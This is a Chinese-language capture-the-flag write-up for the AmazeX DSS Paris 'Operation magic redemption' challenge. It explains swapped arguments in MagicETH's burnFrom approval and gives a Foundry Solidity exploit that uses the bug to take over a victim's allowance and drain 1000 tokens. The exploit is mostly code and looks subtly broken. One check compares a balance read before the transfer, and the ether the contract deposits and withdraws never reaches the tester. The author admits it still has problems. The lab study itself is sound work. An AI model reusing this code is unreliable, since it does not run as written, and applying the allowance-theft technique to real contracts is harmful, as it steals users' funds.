## AMAZEX-DSS-PARIS Operation magic redemption 
这明明是个很简单的题我却看了很久都没有发现问题，最后看了下攻击原型https://foresightnews.pro/article/detail/32350，才发现问题所在

具体是`burnFrom`里的`_approve(account, msg.sender, currentAllowance - amount);`前两个参数放反了。于是我们可以先允许exploiter用攻击合约的ether，调用这个函数使amount=0，然后现在这个approve允许攻击合约用exploiter的ether了

### 解题
``` solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

contract Hack {
    //mETH是一个代币
    MagicETH public mETH;
    //owner就是exploiter，我要窃取他的1000weth，然后变为eth
    address public owner;
    
    constructor(MagicETH meth, address _owner) {
        mETH = meth;
        owner = _owner;
    }

    function hack() public {
        // 批准exploiter用攻击合约代币，这是为了利用MagicETH里的漏洞
        mETH.approve(address(owner), type(uint256).max);

        //确保批准成功
        uint256 currentAllowance = mETH.allowance(address(this),owner);
        require(currentAllowance == type(uint256).max,"approve failed");


        uint256 ownerBalance = mETH.balanceOf(owner);
        

        // 利用漏洞
        mETH.burnFrom(owner, 0 ether);

        // 确保能够从所有者地址成功转移代币
        mETH.transferFrom(owner, address(this), 1000 ether);
        require(ownerBalance == 0 ether, "transfer failed");
        
        //转化weth为eth
        mETH.deposit{value: 1000 ether}();

        mETH.withdraw(1000 ether);
        //forge test --match-path test/Challenge1.t.sol  进行测试
    }
}


/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge1Test is Test {
    MagicETH public mETH;

    address public exploiter = makeAddr("exploiter");
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        mETH = new MagicETH();

        mETH.deposit{value: 1000 ether}();
        // exploiter is in control of 1000 tokens
        mETH.transfer(exploiter, 1000 ether);
    }

    function testExploit() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge1Test -vvvv //
        ////////////////////////////////////////////////////*/

        Hack hackcontract = new Hack(mETH,exploiter);
        hackcontract.hack();



        //==================================================//
        vm.stopPrank();

        assertEq(whitehat.balance, 1000 ether, "whitehat should have 1000 ether");
    }
}

```
还有点问题明天更改
